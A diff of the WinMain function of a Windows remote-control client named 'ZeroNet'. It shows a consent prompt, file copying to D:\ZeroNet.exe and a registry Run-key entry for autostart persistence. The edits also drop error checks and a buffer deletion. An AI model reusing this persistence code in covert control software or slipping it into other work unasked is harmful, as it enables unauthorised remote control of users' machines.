@@ -16,7 +16,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
                      int       nCmdShow)
 {
     //安全确认机制，防止被恶意利用
-    if(IDNO == MessageBox(NULL,"确认要被控制吗?","!!!!!",MB_YESNO))
+    if(IDNO == MessageBox(NULL,"Really want to be controlled?","!!!!!",MB_YESNO))
     {
         return -1;
     }
@@ -41,7 +41,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
     if(sourcehandle==INVALID_HANDLE_VALUE)
     {
         CloseHandle(sourcehandle);
-        return;
+        return -1;
     }
     DWORD filesize=GetFileSize(sourcehandle,NULL);
     char *filebuf=new char[filesize+1];
@@ -64,10 +64,9 @@ int APIENTRY WinMain(HINSTANCE hInstance,
     //将D盘下的文件添加进注册表，实现开机自启动
     HKEY hKey;
     LPCTSTR lpRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
-    long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
-    lRet = RegSetValueEx(hKey, TEXT("ZeroNet"), 0, REG_SZ, (BYTE *)"D:\\ZeroNet.exe", dwRet);
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
+    RegSetValueEx(hKey, TEXT("ZeroNet"), 0, REG_SZ, (BYTE *)"D:\\ZeroNet.exe", dwRet);
     RegCloseKey(hKey);
-    delete []sourcefile;
 
     // 主循环
     ZeroClient client;
